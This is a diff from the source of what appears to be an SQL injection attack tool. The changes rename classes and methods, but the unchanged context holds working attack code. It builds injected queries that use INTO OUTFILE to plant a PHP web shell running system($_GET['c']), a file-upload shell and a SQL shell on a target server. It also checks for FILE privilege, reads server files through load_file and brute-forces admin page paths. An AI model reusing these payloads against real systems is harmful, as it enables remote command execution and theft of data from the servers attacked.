@@ -42,8 +42,8 @@ import com.jsql.exception.StoppableException;
 import com.jsql.model.InjectionModel;
 import com.jsql.model.StoppableLoopIntoResults;
 import com.jsql.model.bean.Request;
-import com.jsql.tool.StringTool;
-import com.jsql.view.GUIMediator;
+import com.jsql.tool.ToolsString;
+import com.jsql.view.MediatorGUI;
 import com.jsql.view.list.dnd.ListItem;
 
 /**
@@ -109,13 +109,13 @@ public class RessourceAccessObject {
         int nb = 0;
         String progressURL = "";
         ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
-        CompletionService<AdminPageCallable> taskCompletionService
-            = new ExecutorCompletionService<AdminPageCallable>(taskExecutor);
+        CompletionService<CallableAdminPage> taskCompletionService
+            = new ExecutorCompletionService<CallableAdminPage>(taskExecutor);
         for (String segment: cheminArray) {
             progressURL += segment;
 
             for (ListItem s: list) {
-                taskCompletionService.submit(new AdminPageCallable(debut + progressURL + s.toString()));
+                taskCompletionService.submit(new CallableAdminPage(debut + progressURL + s.toString()));
             }
         }
 
@@ -123,13 +123,13 @@ public class RessourceAccessObject {
         for (int tasksHandled = 0; tasksHandled < submittedTasks
                 && !this.endAdminSearch; tasksHandled++) {
             try {
-                AdminPageCallable currentCallable = taskCompletionService.take().get();
+                CallableAdminPage currentCallable = taskCompletionService.take().get();
                 if (currentCallable.getResponseCodeHTTP() != null
                         && currentCallable.getResponseCodeHTTP().indexOf("200 OK") >= 0) {
                     Request request = new Request();
                     request.setMessage("CreateAdminPageTab");
                     request.setParameters(currentCallable.getUrl());
-                    GUIMediator.model().interact(request);
+                    MediatorGUI.model().interact(request);
 
                     nb++;
                 }
@@ -153,7 +153,7 @@ public class RessourceAccessObject {
 
         Request request = new Request();
         request.setMessage("EndAdminSearch");
-        GUIMediator.model().interact(request);
+        MediatorGUI.model().interact(request);
     }
     
     /**
@@ -169,39 +169,39 @@ public class RessourceAccessObject {
             return;
         }
 
-        GUIMediator.model().inject(
-            GUIMediator.model().initialQuery.replaceAll(
-                "1337" + GUIMediator.model().visibleIndex + "7331",
-                "(select+0x" + StringTool.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>") + ")"
+        MediatorGUI.model().inject(
+            MediatorGUI.model().initialQuery.replaceAll(
+                "1337" + MediatorGUI.model().visibleIndex + "7331",
+                "(select+0x" + ToolsString.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>") + ")"
             ).replaceAll("--++", "")
             + "+into+outfile+\"" + path + WEBSHELL_FILENAME + "\"--+"
         );
 
         String[] sourcePage = {""};
         String hexResult = new StoppableLoopIntoResults().action(
-                "concat(hex(load_file(0x" + StringTool.strhex(path + WEBSHELL_FILENAME) + ")),0x69)",
+                "concat(hex(load_file(0x" + ToolsString.strhex(path + WEBSHELL_FILENAME) + ")),0x69)",
                 sourcePage,
                 false,
                 1,
                 null);
 
         if ("".equals(hexResult)) {
-            GUIMediator.model().sendResponseFromSite("Can't find web shell at " + path + WEBSHELL_FILENAME, sourcePage[0].trim());
+            MediatorGUI.model().sendResponseFromSite("Can't find web shell at " + path + WEBSHELL_FILENAME, sourcePage[0].trim());
             return;
         }
 
         String url = newUrl;
         if ("".equals(url)) {
-            url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
+            url = MediatorGUI.model().initialUrl.substring(0, MediatorGUI.model().initialUrl.lastIndexOf('/') + 1);
         }
 
         List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
-        if (StringTool.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
+        if (ToolsString.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
             Request request = new Request();
             request.setMessage("CreateShellTab");
             request.setParameters(path, url);
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
         } else {
             LOGGER.warn("Web shell not usable.");
         }
@@ -222,35 +222,35 @@ public class RessourceAccessObject {
         
         String phpShell = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
 
-        GUIMediator.model().inject(
-                GUIMediator.model().initialQuery.replaceAll(
-                        "1337" + GUIMediator.model().visibleIndex + "7331",
-                        "(select+0x" + StringTool.strhex("<SQLi>" + phpShell + "<iLQS>") + ")"
+        MediatorGUI.model().inject(
+                MediatorGUI.model().initialQuery.replaceAll(
+                        "1337" + MediatorGUI.model().visibleIndex + "7331",
+                        "(select+0x" + ToolsString.strhex("<SQLi>" + phpShell + "<iLQS>") + ")"
                 ).replaceAll("--++", "")
                 + "+into+outfile+\"" + path + UPLOAD_FILENAME + "\"--+"
         );
 
         String[] sourcePage = {""};
         String hexResult = new StoppableLoopIntoResults().action(
-                "concat(hex(load_file(0x" + StringTool.strhex(path + UPLOAD_FILENAME) + ")),0x69)",
+                "concat(hex(load_file(0x" + ToolsString.strhex(path + UPLOAD_FILENAME) + ")),0x69)",
                 sourcePage,
                 false,
                 1,
                 null);
 
         if ("".equals(hexResult)) {
-            GUIMediator.model().sendResponseFromSite("Can't find upload file at " + path + UPLOAD_FILENAME, sourcePage[0].trim());
+            MediatorGUI.model().sendResponseFromSite("Can't find upload file at " + path + UPLOAD_FILENAME, sourcePage[0].trim());
             return;
         }
 
         String url = newUrl;
         if ("".equals(url)) {
-            url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
+            url = MediatorGUI.model().initialUrl.substring(0, MediatorGUI.model().initialUrl.lastIndexOf('/') + 1);
         }
 
         List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
-        if (StringTool.hexstr(hexResult).indexOf(phpShell) > -1) {
+        if (ToolsString.hexstr(hexResult).indexOf(phpShell) > -1) {
             
             String crLf = "\r\n";
             URLConnection conn = null;
@@ -276,7 +276,7 @@ public class RessourceAccessObject {
                 message2 += crLf + "-----------------------------4664151417711--" + crLf;
 
                 conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
-                conn.setRequestProperty("Content-Length", String.valueOf((message1.length() + message2.length() + imgData.length)));
+                conn.setRequestProperty("Content-Length", String.valueOf(message1.length() + message2.length() + imgData.length));
 
                 os = conn.getOutputStream();
                 os.write(message1.getBytes());
@@ -321,12 +321,12 @@ public class RessourceAccessObject {
                 msgHeader.put("Cookie", "");
                 msgHeader.put("Post", "");
                 msgHeader.put("Header", "");
-                msgHeader.put("Response", StringTool.getHTTPHeaders(conn));
+                msgHeader.put("Response", ToolsString.getHTTPHeaders(conn));
 
                 Request request = new Request();
                 request.setMessage("MessageHeader");
                 request.setParameters(msgHeader);
-                GUIMediator.model().interact(request);
+                MediatorGUI.model().interact(request);
             } catch (Exception e) {
                 LOGGER.error(e, e);
             } finally {
@@ -347,7 +347,7 @@ public class RessourceAccessObject {
         
         Request request = new Request();
         request.setMessage("EndUpload");
-        GUIMediator.model().interact(request);
+        MediatorGUI.model().interact(request);
     }
     
     /**
@@ -360,7 +360,7 @@ public class RessourceAccessObject {
         String[] sourcePage = {""};
 
         String hexResult = new StoppableLoopIntoResults().action(
-                "concat((select+hex(if(count(*)=1,0x" + StringTool.strhex("true") + ",0x" + StringTool.strhex("false") +
+                "concat((select+hex(if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") +
                 "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)", 
                 sourcePage,
                 false,
@@ -368,21 +368,21 @@ public class RessourceAccessObject {
                 null);
 
         if ("".equals(hexResult)) {
-            GUIMediator.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
+            MediatorGUI.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
             hasFileRight = false;
-        } else if (StringTool.hexstr(hexResult).equals("false")) {
+        } else if ("false".equals(ToolsString.hexstr(hexResult))) {
             LOGGER.warn("No FILE privilege");
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
             hasFileRight = false;
         } else {
             Request request = new Request();
             request.setMessage("MarkFileSystemVulnerable");
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
             hasFileRight = true;
         }
         
@@ -402,26 +402,26 @@ public class RessourceAccessObject {
 
         int nb = 0;
         ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
-        CompletionService<FileCallable> taskCompletionService = new ExecutorCompletionService<FileCallable>(taskExecutor);
+        CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<CallableFile>(taskExecutor);
 
         for (ListItem s: list) {
-            taskCompletionService.submit(new FileCallable(s.toString()));
+            taskCompletionService.submit(new CallableFile(s.toString()));
         }
 
         List<String> duplicate = new ArrayList<String>();
         int submittedTasks = list.size();
         for (int tasksHandled = 0; tasksHandled < submittedTasks && !endFileSearch; tasksHandled++) {
             try {
-                FileCallable currentCallable = taskCompletionService.take().get();
+                CallableFile currentCallable = taskCompletionService.take().get();
                 if (!"".equals(currentCallable.getFileSource())) {
                     String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
-                    String content = StringTool.hexstr(currentCallable.getFileSource()).replace("\r", "");
+                    String content = ToolsString.hexstr(currentCallable.getFileSource()).replace("\r", "");
                     String path = currentCallable.getUrl();
 
                     Request request = new Request();
                     request.setMessage("CreateFileTab");
                     request.setParameters(name, content, path);
-                    GUIMediator.model().interact(request);
+                    MediatorGUI.model().interact(request);
 
                     if (!duplicate.contains(path.replace(name, ""))) {
                         LOGGER.info(
@@ -451,7 +451,7 @@ public class RessourceAccessObject {
         LOGGER.info("File(s) found: " + nb + "/" + submittedTasks);
         Request request = new Request();
         request.setMessage("EndFileSearch");
-        GUIMediator.model().interact(request);
+        MediatorGUI.model().interact(request);
     }
     
     /**
@@ -486,12 +486,12 @@ public class RessourceAccessObject {
             msgHeader.put("Cookie", "");
             msgHeader.put("Post", "");
             msgHeader.put("Header", "");
-            msgHeader.put("Response", StringTool.getHTTPHeaders(connection));
+            msgHeader.put("Response", ToolsString.getHTTPHeaders(connection));
             
             Request request = new Request();
             request.setMessage("MessageHeader");
             request.setParameters(msgHeader);
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
         } catch (MalformedURLException e) {
             LOGGER.error(e, e);
         } catch (IOException e) {
@@ -501,7 +501,7 @@ public class RessourceAccessObject {
             Request request = new Request();
             request.setMessage("GetShellResult");
             request.setParameters(terminalID, result, cmd);
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
         }
     }
 
@@ -528,36 +528,36 @@ public class RessourceAccessObject {
 "else if($result==FALSE)echo'<SQLm>Query failed';" +
                 " ?><iLQS>";
 
-        GUIMediator.model().inject(
-                GUIMediator.model().initialQuery.replaceAll("1337" + GUIMediator.model().visibleIndex + "7331", "(select+0x" + StringTool.strhex(s) + ")").replaceAll("--++", "") +
+        MediatorGUI.model().inject(
+                MediatorGUI.model().initialQuery.replaceAll("1337" + MediatorGUI.model().visibleIndex + "7331", "(select+0x" + ToolsString.strhex(s) + ")").replaceAll("--++", "") +
                 "+into+outfile+\"" + path + SQLSHELL_FILENAME + "\"--+"
                 );
 
         String[] sourcePage = {""};
         String hexResult = new StoppableLoopIntoResults().action(
-                "concat(hex(load_file(0x" + StringTool.strhex(path + SQLSHELL_FILENAME) + ")),0x69)",
+                "concat(hex(load_file(0x" + ToolsString.strhex(path + SQLSHELL_FILENAME) + ")),0x69)",
                 sourcePage,
                 false,
                 1,
                 null);
 
         if ("".equals(hexResult)) {
-            GUIMediator.model().sendResponseFromSite("Can't find SQL shell at " + path + SQLSHELL_FILENAME, sourcePage[0].trim());
+            MediatorGUI.model().sendResponseFromSite("Can't find SQL shell at " + path + SQLSHELL_FILENAME, sourcePage[0].trim());
             return;
         }
         
         String url = newUrl;
         if ("".equals(url)) {
-            url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
+            url = MediatorGUI.model().initialUrl.substring(0, MediatorGUI.model().initialUrl.lastIndexOf('/') + 1);
         }
 
         List<String> f = new ArrayList<String>();
         f.add(path.substring(path.lastIndexOf('/'), path.length()));
-        if (StringTool.hexstr(hexResult).indexOf(s) > -1) {
+        if (ToolsString.hexstr(hexResult).indexOf(s) > -1) {
             Request request = new Request();
             request.setMessage("CreateSQLShellTab");
             request.setParameters(path, url, user, pass);
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
         } else {
             LOGGER.warn("SQL shell not usable.");
         }
@@ -597,12 +597,12 @@ public class RessourceAccessObject {
             msgHeader.put("Cookie", "");
             msgHeader.put("Post", "");
             msgHeader.put("Header", "");
-            msgHeader.put("Response", StringTool.getHTTPHeaders(connection));
+            msgHeader.put("Response", ToolsString.getHTTPHeaders(connection));
             
             Request request = new Request();
             request.setMessage("MessageHeader");
             request.setParameters(msgHeader);
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
         } catch (MalformedURLException e) {
             LOGGER.error(e, e);
         } catch (IOException e) {
@@ -612,7 +612,7 @@ public class RessourceAccessObject {
             Request request = new Request();
             request.setMessage("GetSQLShellResult");
             request.setParameters(terminalID, result, cmd);
-            GUIMediator.model().interact(request);
+            MediatorGUI.model().interact(request);
         }
     }
 }
